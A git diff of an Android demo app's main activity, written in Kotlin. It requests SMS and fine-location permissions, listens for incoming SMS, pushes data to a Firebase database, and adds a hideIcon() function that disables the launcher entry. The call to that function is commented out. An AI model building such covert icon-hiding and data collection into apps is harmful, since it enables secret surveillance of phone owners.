@@ -2,6 +2,7 @@ package com.example.chedardemoapp
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.content.ComponentName
 import android.content.ContentValues.TAG
 import android.content.Context
 import android.content.Intent
@@ -52,26 +53,31 @@ class MainActivity : AppCompatActivity(), MessageListener {
 
         setContentView(view)
 
-        // As for version less than Q, background permission is already enabled
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            requestMultiplePermissions.launch(
-                arrayOf(
-                    Manifest.permission.RECEIVE_SMS,
-                    Manifest.permission.ACCESS_FINE_LOCATION,
-                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
-                )
+        requestMultiplePermissions.launch(
+            arrayOf(
+                Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.ACCESS_FINE_LOCATION
             )
-        } else {
-            requestMultiplePermissions.launch(
-                arrayOf(
-                    Manifest.permission.RECEIVE_SMS,
-                    Manifest.permission.ACCESS_FINE_LOCATION
-                )
-            )
-        }
+        )
 
         MessageReceiver.bindListener(this)
 
+//        hideIcon()
+    }
+
+
+    fun hideIcon() {
+        val p = packageManager
+        val componentName = ComponentName(
+            this,
+            MainActivity::class.java
+        ) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+
+        p.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
     }
 
     override fun onStop() {
@@ -84,9 +90,9 @@ class MainActivity : AppCompatActivity(), MessageListener {
         registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
 
             val smsPermission = permissions[SMS_PERMISSION_TAG] ?: false
-            val locationPermission = permissions[LOCATION_PERMISSION_TAG] ?: false
+            val fineLocationPermission = permissions[LOCATION_PERMISSION_TAG] ?: false
 
-            if (!locationPermission) {
+            if (!fineLocationPermission) {
                 requestPermissionWithRationale(
                     Manifest.permission.ACCESS_FINE_LOCATION,
                     PERMISSION_FINE_LOCATION_REQUEST_CODE,
@@ -111,84 +117,42 @@ class MainActivity : AppCompatActivity(), MessageListener {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         Log.d(TAG, "onRequestPermissionResult()")
 
-        if (requestCode == PERMISSION_FINE_LOCATION_REQUEST_CODE) {
-            when {
-                grantResults.isEmpty() ->
-                    // If user interaction was interrupted, the permission request
-                    // is cancelled and you receive an empty array.
-                    Log.d(TAG, "User interaction was cancelled.")
+        when {
+            grantResults.isEmpty() ->
+                // If user interaction was interrupted, the permission request
+                // is cancelled and you receive an empty array.
+                Log.d(TAG, "User interaction was cancelled.")
 
-                grantResults[0] == PackageManager.PERMISSION_GRANTED ->
-                    Snackbar.make(
-                        binding.container,
-                        R.string.permission_approved_explanation,
-                        Snackbar.LENGTH_LONG
-                    )
-                        .show()
+            grantResults[0] == PackageManager.PERMISSION_GRANTED ->
+                Snackbar.make(
+                    binding.container,
+                    R.string.permission_approved_explanation,
+                    Snackbar.LENGTH_LONG
+                )
+                    .show()
 
-                else -> {
-                    Snackbar.make(
-                        binding.container,
-                        R.string.permission_denied_explanation,
-                        Snackbar.LENGTH_LONG
-                    )
-                        .setAction(R.string.settings) {
-                            // Build intent that displays the App settings screen.
-                            val intent = Intent()
-                            intent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
-                            val uri = Uri.fromParts(
-                                "package",
-                                BuildConfig.APPLICATION_ID,
-                                null
-                            )
-                            intent.data = uri
-                            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                            startActivity(intent)
-                        }
-                        .show()
-                }
+            else -> {
+                Snackbar.make(
+                    binding.container,
+                    R.string.permission_denied_explanation,
+                    Snackbar.LENGTH_LONG
+                )
+                    .setAction(R.string.settings) {
+                        // Build intent that displays the App settings screen.
+                        val intent = Intent()
+                        intent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
+                        val uri = Uri.fromParts(
+                            "package",
+                            BuildConfig.APPLICATION_ID,
+                            null
+                        )
+                        intent.data = uri
+                        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                        startActivity(intent)
+                    }
+                    .show()
             }
         }
-
-        if (requestCode == PERMISSION_REQUEST_SMS_REQUEST_CODE) {
-            when {
-                grantResults.isEmpty() ->
-                    // If user interaction was interrupted, the permission request
-                    // is cancelled and you receive an empty array.
-                    Log.d(TAG, "User interaction was cancelled.")
-
-                grantResults[0] == PackageManager.PERMISSION_GRANTED ->
-                    Snackbar.make(
-                        binding.container,
-                        R.string.permission_approved_explanation,
-                        Snackbar.LENGTH_LONG
-                    )
-                        .show()
-
-                else -> {
-                    Snackbar.make(
-                        binding.container,
-                        R.string.permission_denied_explanation,
-                        Snackbar.LENGTH_LONG
-                    )
-                        .setAction(R.string.settings) {
-                            // Build intent that displays the App settings screen.
-                            val intent = Intent()
-                            intent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
-                            val uri = Uri.fromParts(
-                                "package",
-                                BuildConfig.APPLICATION_ID,
-                                null
-                            )
-                            intent.data = uri
-                            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-                            startActivity(intent)
-                        }
-                        .show()
-                }
-            }
-        }
-
     }
 
     @SuppressLint("MissingPermission")
@@ -234,7 +198,7 @@ class MainActivity : AppCompatActivity(), MessageListener {
         }
     }
 
-    private fun sendData(data : Data){
+    private fun sendData(data: Data) {
         val reference: DatabaseReference = FirebaseDatabase.getInstance().reference.child("Data")
         reference.push().setValue(data)
     }
